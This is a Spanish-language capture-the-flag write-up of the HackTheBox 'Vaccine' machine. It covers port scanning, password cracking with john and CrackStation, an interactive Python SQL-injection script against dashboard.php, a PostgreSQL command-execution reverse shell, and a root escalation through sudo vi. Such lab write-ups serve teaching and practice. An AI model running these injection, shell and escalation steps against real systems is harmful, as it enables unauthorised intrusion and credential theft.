# VACCINE

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n -oG allPorts 10.10.10.46
```

```bash
File: allPorts

# Nmap 7.91 scan initiated Tue Jun  8 22:53:54 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n -oG allPorts 10.10.10.46
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.46 ()	Status: Up
Host: 10.10.10.46 ()	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65532)
# Nmap done at Tue Jun  8 22:54:05 2021 -- 1 IP address (1 host up) scanned in 10.91 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p21,22,80 -oN targeted 10.10.10.46
```

```bash
File: targeted

# Nmap 7.91 scan initiated Tue Jun  8 22:54:44 2021 as: nmap -sC -sV -p21,22,80 -oN targeted 10.10.10.46
Nmap scan report for 10.10.10.46
Host is up (0.038s latency).


PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  8 22:54:53 2021 -- 1 IP address (1 host up) scanned in 8.71 seconds
```

<br>

Podemos ver que solamente tenemos tres puertos abiertos. El primero de ellos corresponde al puerto 21 (FTP), el segundo al puerto 22 (SSH) y el tercero al puerto 80 (HTTP).

Como sabemos, las máquinas que estamos resolviendo están relacionadas entre sí. En la post explotación de la máquina Oopsie descubrimos las siguientes credenciales que correspondían al servicio Filezilla (servidor FTP):

```plaintext
File: ftpCred

ftpuser:mc@F1l3ZilL4
```

<br>

### FTP
Por tanto, probaremos si estas credenciales son válidas. Para conectarnos por FTP a la máquina víctima:

<img src="https://i.imgur.com/BXXyT9f.png" width=700>

<br>

Podemos ver que las credenciales son correctas. Nos encontraremos con un archivo llamado backup.zip. Probaremos a descomprimirlo:

<img src="https://i.imgur.com/Vb2sBrY.png" width=700>

El archivo backup.zip está encriptado por lo que para extraerlo tendremos que conocer su contraseña. 

<br>

### Cracking
Ya que no tenemos ninguna credencial que nos pueda servir para descifrar el fichero .zip, probaremos a aplicar fuerza bruta sobre el mismo. Para ello, lo primero que haremos será extraer su hash mediante la utilidad [zip2jhon](https://github.com/openwall/john):

```bash
zip2john backup.zip 
```

```plaintext
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
backup.zip:$pkzip2$2*2*1*0*8*24*3a41*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*1b1c*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip2$::backup.zip:style.css, index.php:backup.zip
```

Una vez extraído el hash correspondiente al zip usaremos [John](https://github.com/openwall/john) junto al diccionario rockyou.txt para intentar crackear su contraseña:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
```

```plaintext
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2021-07-21 09:44) 16.66g/s 136533p/s 136533c/s 136533C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Como vemos, la contraseña de desencriptado del .zip es: 

```plaintext
File: zipPass

741852963
```

<br>

Una vez extraído, nos encontraremos con dos archivos:
- Index.php
- Style.css

Comenzaremos por el archivo index.php:

```php
File: index.php

<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

Como vemos, el servidor web nos provee de un panel de registro que se comprueba mediante una función PHP.  Esta función contiene el hash MD5 de la contraseña del usuario admin.

Probaremos a descifrar la contraseña mediante la utilidad https://crackstation.net/ que nos proveerá de rainbow tables para varios algoritmos, entre ellos MD5:

<img src="https://i.imgur.com/X9CoIoH.png" width=700>

Podemos ver que las credenciales son:

```plaintext
File: webCred

admin:qwerty789
```

<br>

Si accedemos al servidor web podremos ver el siguiente panel de login:

<img src="https://i.imgur.com/SUi75OG.png" width=400>

Probando las credenciales de acceso que acabamos de conseguir podremos acceder como el usuario admin:

<img src="https://i.imgur.com/mTM4Ird.png" width=700>

<br>

## Shell de usuario

### SQLi
Examinando el código fuente de la página web principal, podremos ver que es una página web estática y que el único parámetro variable de la misma es el panel de búsqueda.

Probaremos este panel de búsqueda para ver como se están efectuando las búsquedas a nivel de red:

<img src="https://i.imgur.com/XzGsEGY.png" width=700>

Si nos fijamos en la URL, podremos ver que las búsquedas se hacen mediante un parámetro PHP, el parámetro search:

<img src="https://i.imgur.com/aHMTEEo.png" width=300>

Esto nos puede dar de que pensar, ya que normalmente este tipo de búsquedas se hacen contra una base de datos, eso significa que si los parámetros de usuario no se sanitizan, podremos ejecutar código SQL.

Con esto en mente, probaremos el típico reconocimiento para comprobar si la web es vulnerable frente a inyección SQL debida a error. Para ello:

```http
http://10.10.10.46/dashboard.php?search='
```

Como vemos, se nos mostrará un error en la página web, esto significa que es vulnerable frente a inyección SQL debida a error:

<img src="https://i.imgur.com/5DMIrwU.png" width=700>

<br>

Para explotar la inyección SQL nos construiremos un script en [Python3](https://www.python.org/downloads/) que nos permita trabajar de forma más cómoda:

```python
File: SQLi.py

#!/usr/bin/python3
# coding: utf-8

# Author: Gaizka Martin (a.k.a g2jz)

import requests
import re
import signal
import urllib
import sys
import time

from pwn import *


# Variables globales
login_url = "http://10.10.10.46/index.php"
sqli_url = "http://10.10.10.46/dashboard.php"


# Sesion HTTP
s = requests.Session()


# Ctrl + C
def handler(sig,frame):
	
	print("")
	log.failure("Saliendo...")
	sys.exit(1)


signal.signal(signal.SIGINT,handler)


# Login
def login():

	log.info("Accediendo al recurso vulnerable a SQLi")
	time.sleep(1)
	print("")

	login_data = {
		'username' : 'admin',
		'password' : 'qwerty789'
	}

	r = s.post(login_url, data=login_data)


# SQLi
def makeRequest(cmd):
	
	query = "?search=b' " + urllib.parse.quote(cmd + "--", encoding="utf-8", errors=None)
	payload = sqli_url + query

	r = s.get(payload)
	
	if "LINE" in r.text:
		error = re.findall(r'LINE 1: (.*)',r.text)[0]

		print("")
		log.failure("Error:" + error)
		print("")
	elif "lalign" in r.text:
		print("")
		success = re.findall(r'<td class=\'lalign\'>(.*?)</td>', r.text)[0]
		for out in success:
			log.info(out)
		print("")
	else:
		print("")
		log.info("El comando introducido no ha producido error")
		print("")


# Main
if __name__ == "__main__":
	
	try:
		login()
	except:
		log.failure("Se ha producido un error al iniciar sesión")
		sys.exit(1)

	while True:
	
		print("[+] Comando (?search=b' ): ", end="")
		cmd = input().strip()
		
		try:
			makeRequest(cmd)
		except:
			log.failure("Se ha producido un error en la inyección SQL")

```

<br>

<img src="https://i.imgur.com/XvxXgU9.png" width=700>


Lo primero que haremos será comprobar el número de columnas que tiene la tabla de la que se están seleccionando los datos. Para ello, acotaremos el número hasta encontrar su valor exacto. Empezaremos ordenando la sentencia SQL de búsqueda por la columna 100, esto nos arrojara un error, lo que significara que la tabla no cuenta con 100 columnas. Probaremos con números más pequeños, por ejemplo el 5, veremos que esto no nos devuelve ningún error por lo que sabremos que la tabla cuenta con 5 columnas o más. Probaremos el siguiente número que será el 6, como vemos esto nos devolverá un error por lo que habremos encontrado que la tabla tiene 5 columnas.

<img src="https://i.imgur.com/iTGUmON.png" width=700>

Lo próximo que haremos será un union select con el número de columnas, en uno de sus parámetros inyectaremos código SQL para ver si conseguimos que se interprete. Como vemos si inyectamos en el segundo parámetro el comando version( ), podremos enumerar la versión de la base de datos. Vemos que estamos ante un base de datos PostgreSQL de versión 11.5.

<br>

### Reverse shell
Como vemos tenemos ejecución remota de comandos por lo que procederemos a enviar una reverse-shell desde el servidor SQL hacia nuestro equipo. 

Para ello lo primero que haremos será ponernos en escucha con [Netcat](http://netcat.sourceforge.net/) por el puerto 443:

```bash
nc -nlvp 443
```

Lo proximo que haremos será aprovecharnos del bug [authenticated arbitrary command execution on postgresql > 9.3](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Este bug nos permite crear una tabla maliciosa en la que ejecutaremos codigo a nivel de sistema. Procederemos a crearla y a entablarnos una reverse shell mediante bash por el puerto 443. Para ello:

<img src="https://i.imgur.com/O8KANJn.png" width=700>

En este punto habremos conseguido una reverse shell como el usuario postgres:

<img src="https://i.imgur.com/R2vDX79.png" width=700>

<br>

## Shell de root

### Enumeración
Lo primero que haremos para enumerar el sistema será tratar de encontrar la contraseña del usuario postgres.

Recordemos que la web hacia las búsquedas contra una base de datos, esto significa que tenemos que tener un archivo en el que se hace la conexión de la página web con la base de datos.

Encontraremos el archivo /var/www/html/dashboard.php en el que se listaran las credenciales de acceso a la base de datos:

<img src="https://i.imgur.com/keEV85u.png" width=700>

```bash
File: postgresCred

postgres:P@s5w0rd!
```

Probaremos estas credenciales listando los recursos que podemos ejecutar como el usuario root:

<img src="https://i.imgur.com/DeiwOhm.png" width=700>

Podemos ver que tenemos la contraseña del usuario postgres y capacidad de editar el archivo pg_hba.conf con vi como el usuario root, por lo que trataremos de editarlo:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

<br>

 ### Vi Code Execution
Una vez dentro del editor vi nos spawnearemos una shell como el usuario root con el siguiente comando:

```bash
:!/bin/bash
```

<img src="https://i.imgur.com/vapYYBf.png" width=400>

Como vemos, ya somos el usuario root por lo que podremos ver la flag root.txt en el directorio /root.